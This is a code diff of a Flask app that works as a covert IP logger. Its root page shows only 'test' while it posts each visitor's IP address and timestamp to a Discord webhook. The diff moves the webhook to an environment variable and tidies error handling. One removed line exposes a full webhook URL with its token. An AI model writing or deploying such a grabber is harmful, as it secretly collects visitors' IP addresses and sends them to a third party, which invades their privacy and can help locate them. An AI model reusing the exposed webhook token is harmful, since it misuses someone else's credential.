@@ -1,9 +1,12 @@
 from flask import Flask, request
-import datetime, requests, json
+import datetime
+import requests
+import os
 
 app = Flask(__name__)
 
-WEBHOOK_URL = "https://ptb.discord.com/api/webhooks/1489458192877617183/O4zvTeV3pxjfNsPQQcmi3twgcMOGDkXjxbUNyfH5MZxFZhGhFf2GjK9BHW-Jd_8Y47Li"
+# Get webhook URL from environment variable (much safer than hardcoding)
+WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
 
 @app.route('/')
 def log_ip():
@@ -14,13 +17,18 @@ def log_ip():
         "content": f"**IP Logged**\n**Time:** {now}\n**IP:** `{ip}`"
     }
     
-    try:
-        requests.post(WEBHOOK_URL, json=data)
-    except:
-        pass  # Don't crash if webhook fails
+    if WEBHOOK_URL:
+        try:
+            requests.post(WEBHOOK_URL, json=data, timeout=5)
+        except:
+            pass  # Silently fail if webhook is down or invalid
+    else:
+        print("Warning: WEBHOOK_URL environment variable not set")
     
-    return "test"
+    return "test"  # You can change this to a better message if needed
 
+# Only run with Flask's dev server locally
 if __name__ == "__main__":
-    print("work")
-    app.run(host="0.0.0.0", port=5000)
+    port = int(os.environ.get("PORT", 5000))
+    print(f"Starting Flask app on port {port}")
+    app.run(host="0.0.0.0", port=port)
